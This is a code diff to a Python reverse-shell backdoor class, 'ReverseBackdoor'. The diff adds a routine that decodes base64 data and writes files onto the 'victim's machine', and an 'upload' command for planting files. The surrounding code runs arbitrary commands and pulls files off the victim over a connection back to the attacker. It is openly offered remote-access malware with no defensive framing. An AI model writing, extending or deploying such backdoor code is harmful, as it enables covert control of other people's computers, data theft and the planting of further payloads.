@@ -90,6 +90,17 @@ class ReverseBackdoor:
 			return base64_file_content
 
 
+	def write_file(self, path, content)->str:
+		'''
+		write downloaded contents from the victim 
+		to the specified path file.
+		'''
+		with open(path, 'wb') as file:
+			bytes_content = base64.b64decode(content)
+			file.write(bytes_content)
+			return (f"[*] File {path} Downloaded successfully on Victim's machine.")
+	
+	
 	def run(self):
 		'''
 		start backdoor.
@@ -101,13 +112,14 @@ class ReverseBackdoor:
 				# remove below line
 				command_lst = command.split(' ')
 				# print(command_lst)
-				command_list_len = len(command_lst)==2
+				command_list_len = len(command_lst)>=2
 				cmd = command_lst[0]
 				if command_list_len:
 					path = command_lst[1]
 				
+				# all these commands are wrt attacker.
 				if cmd == 'exit':
-					self.serial_send(' ')
+					self.serial_send("[!] Victim's connection has been closed.")
 					self.connection.close()
 					sys.exit()
 				
@@ -118,7 +130,13 @@ class ReverseBackdoor:
 					file_content = self.upload_file(path)
 					command_output = str(file_content, encoding='utf-8')
 
+				elif cmd == 'upload' and len(command_lst)==3:
+					# print('[+] Inside upload')
+					file_contents = command_lst[2]
+					command_output = self.write_file(path, file_contents)
+					
 				else:
+					# print('[-] Inside Else')
 					command_output = self.execute_command(command)
 
 				self.serial_send(command_output)
